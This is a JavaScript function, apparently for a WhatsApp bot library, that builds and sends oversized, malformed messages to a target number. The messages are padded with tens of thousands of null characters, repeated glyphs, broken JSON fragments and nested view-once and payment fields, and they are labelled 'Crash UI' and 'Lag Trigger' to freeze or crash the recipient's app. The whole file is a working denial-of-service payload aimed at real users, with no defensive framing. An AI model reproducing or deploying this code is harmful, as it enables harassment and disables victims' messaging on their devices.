async function UiBlankLagRelay(sock, target) {
  const crash = JSON.stringify({ action: "x", data: "x" });

  const payload = {
    text: 'Killertzy' + "\u0000".repeat(85000),
    contextInfo: {
      stanzaId: "ABC123",
      participant: "13135550002@s.whatsapp.net",
      remoteJid: target,
      forwardingScore: 999999,
      isForwarded: true,
      quotedMessage: {
        conversation: "\u200B" + "ꦾ".repeat(30000) + "@1".repeat(10000)
      },
      externalAdReply: {
        title: "Killertzy Heavy",
        body: "Crash UI Beta",
        mediaType: 1,
        previewType: "VIDEO",
        renderLargerThumbnail: true,
        showAdAttribution: true,
        sourceUrl: "https://t.me/Killertzy",
        mediaUrl: "https://t.me/Killertzy"
      },
      groupInviteMessage: {
        groupJid: "120363370626418572@g.us",
        inviteCode: "KILLZ123",
        groupName: "⎋Killertzy" + "៝".repeat(5000),
        caption: "Lag Trigger",
        jpegThumbnail: null
      },
      interactiveMessage: {
        text: "Crash Command!",
        format: "DEFAULT"
      },
      nativeFlowMessage: {
        name: "menu_option",
        paramsJson: "{{{".repeat(2000) + "\u0007\u0007".repeat(5000)
      }
    }
  };

  const viewOnce = {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "?",
          listType: 4,
          buttonText: { displayText: "⚠️ Killertzy" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "KILLZ"
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "💀 Killer",
              body: "⛔️",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                }
              ]
            }
          }
        }
      }
    }
  };

  await sock.sendMessage(target, payload);

  await new Promise(res => setTimeout(res, 800));

  const msg = await generateWAMessageFromContent(target, viewOnce, { userJid: undefined });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}